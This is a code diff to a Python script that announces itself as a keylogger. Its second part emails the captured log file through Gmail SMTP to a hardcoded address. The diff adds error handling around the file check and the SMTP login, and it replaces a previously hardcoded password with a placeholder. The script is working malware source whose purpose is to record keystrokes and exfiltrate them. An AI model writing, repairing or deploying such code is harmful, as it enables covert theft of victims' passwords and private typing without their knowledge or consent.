@@ -20,6 +20,11 @@ try:
 except KeyboardInterrupt:
     print("Keylogger stopped.")
 
+# Ensure the file exists and is readable
+if not os.path.exists(path):
+    print(f"Error: File {path} not found.")
+    exit()
+
 # Part 2: Email Sending
 fromaddr = "7unkym0nk3y@gmail.com"  # Replace with your Gmail address
 toaddr = "7unkym0nk3y@gmail.com"  # Replace with the recipient's email
@@ -43,15 +48,18 @@ try:
         msg.attach(p)
 except FileNotFoundError:
     print(f"Error: {filename} not found.")
+    exit()
 
 # Send email
 try:
     s = smtplib.SMTP("smtp.gmail.com", 587)
     s.starttls()
-    s.set_debuglevel(1)  # Enable SMTP debugging
-    s.login(fromaddr, "test..123")  # Replace with App Password
+    s.set_debuglevel(1)  # Enable SMTP debugging for detailed logs
+    s.login(fromaddr, "your_app_password")  # Replace with your App Password
     s.sendmail(fromaddr, toaddr, msg.as_string())
     print("Email sent successfully.")
+except smtplib.SMTPAuthenticationError:
+    print("Authentication failed. Check your email and App Password.")
 except Exception as e:
     print(f"Error sending email: {e}")
 finally:
